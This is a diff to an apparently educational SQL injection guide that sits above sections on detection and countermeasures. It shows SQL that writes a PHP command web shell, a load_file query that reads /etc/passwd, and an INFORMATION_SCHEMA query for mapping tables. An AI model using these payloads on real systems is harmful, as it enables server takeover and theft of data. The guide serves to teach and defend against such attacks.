@@ -97,8 +97,14 @@ An attacker can write in a file with this kind of sql request
 ```sql 
   select "<?php system([$_GET])" INTO FILE cmd.php 
   ```
-  And then access to it using ``http:domain.com/cmd.php?maliciouscmd``
+  And then access to it using ``http://domain.com/cmd.php?maliciouscmd``
   
+
+## SQLi for reading file
+With Mysql load_file function, with it an attacker can read a file within this kind of request 
+```sql 
+   select load_file("/etc/passwd"); 
+```
 
 
 # How to test/check for SQLi
@@ -287,6 +293,45 @@ http://www.example.com/store/products.php?id='
 Warning: pg_exec() [function.pg-exec]: Query failed: ERROR: unterminated quoted string at or near "'" LINE 1: 
 SELECT * FROM products WHERE ID=' ^ in /var/www/store/products.php on line 9
 ```
+
+## Retrieve the database scheme with sqli 
+
+INFORMATION_SCHEMA is a database within each MySQL instance, the place that stores information about all the other databases that the MySQL server maintains. The INFORMATION_SCHEMA database contains several read-only tables. They are actually views, not base tables, so there are no files associated with them, and you cannot set triggers on them. Also, there is no database directory with that name. 
+
+ Here is an example of a statement that retrieves information from INFORMATION_SCHEMA: 
+ ```sql 
+ SELECT table_name, table_type, engine
+       FROM information_schema.tables
+       WHERE table_schema = 'db5'
+       ORDER BY table_name;
+
+```
+
+| table_name | table_type | engine |
+|------------|:-----------:|------:|
+| fk         | BASE TABLE | InnoDB |
+| fk2        | BASE TABLE | InnoDB |
+| goto       | BASE TABLE | MyISAM |
+| into       | BASE TABLE | MyISAM |
+| k          | BASE TABLE | MyISAM |
+| kurs       | BASE TABLE | MyISAM |
+| loop       | BASE TABLE | MyISAM |
+| pk         | BASE TABLE | InnoDB |
+| t          | BASE TABLE | MyISAM |
+| t2         | BASE TABLE | MyISAM |
+| t3         | BASE TABLE | MyISAM |
+| t7         | BASE TABLE | MyISAM |
+| tables     | BASE TABLE | MyISAM |
+| v          | VIEW       | NULL   |
+| v2         | VIEW       | NULL   |
+| v3         | VIEW       | NULL   |
+| v56        | VIEW       | NULL   |
+
+17 rows in set (0.01 sec)
+
+Above a result of querying on **information_schema.tables** which shows all the tables in database. 
+
+
 # Presence detection
 # Countermeasures guidelines
 ## Server side
